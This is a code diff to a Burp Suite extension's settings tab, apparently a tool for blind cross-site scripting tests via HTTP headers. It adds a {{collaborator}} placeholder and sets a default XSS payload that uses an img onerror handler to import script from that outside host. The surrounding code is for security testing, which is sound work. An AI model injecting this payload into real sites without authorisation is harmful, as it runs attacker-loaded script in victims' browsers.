@@ -323,10 +323,16 @@ public class HeaderBangerTab {
         panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
         
         // Info panel
-        JPanel infoPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
+        JPanel infoPanel = new JPanel();
+        infoPanel.setLayout(new BoxLayout(infoPanel, BoxLayout.Y_AXIS));
         JLabel infoLabel = new JLabel("Configure the XSS payload used for testing:");
         infoLabel.setFont(infoLabel.getFont().deriveFont(Font.PLAIN, 12f));
         infoPanel.add(infoLabel);
+        
+        JLabel collaboratorLabel = new JLabel("Use {{collaborator}} placeholder to leverage Burp's Collaborator:");
+        collaboratorLabel.setFont(collaboratorLabel.getFont().deriveFont(Font.ITALIC, 11f));
+        collaboratorLabel.setForeground(Color.BLUE);
+        infoPanel.add(collaboratorLabel);
         
         // Payload text area - single line
         bxssPayloadField = new JTextArea(extension.getBxssPayload(), 1, 40); // Changed from 4 rows to 1 row, increased columns
@@ -579,8 +585,7 @@ public class HeaderBangerTab {
     }
 
     private void setDefaultBxssPayload() {
-        CollaboratorPayload payload = extension.getCollaboratorClient().generatePayload();
-        String defaultPayload = "Mozilla\"><img/src/onerror=import('//" + payload.toString() + "')>";
+        String defaultPayload = "Mozilla\"><img/src/onerror=import('//{{collaborator}}')>";
         extension.setBxssPayload(defaultPayload);
         bxssPayloadField.setText(defaultPayload);
         extension.updateInjectedHeaders();
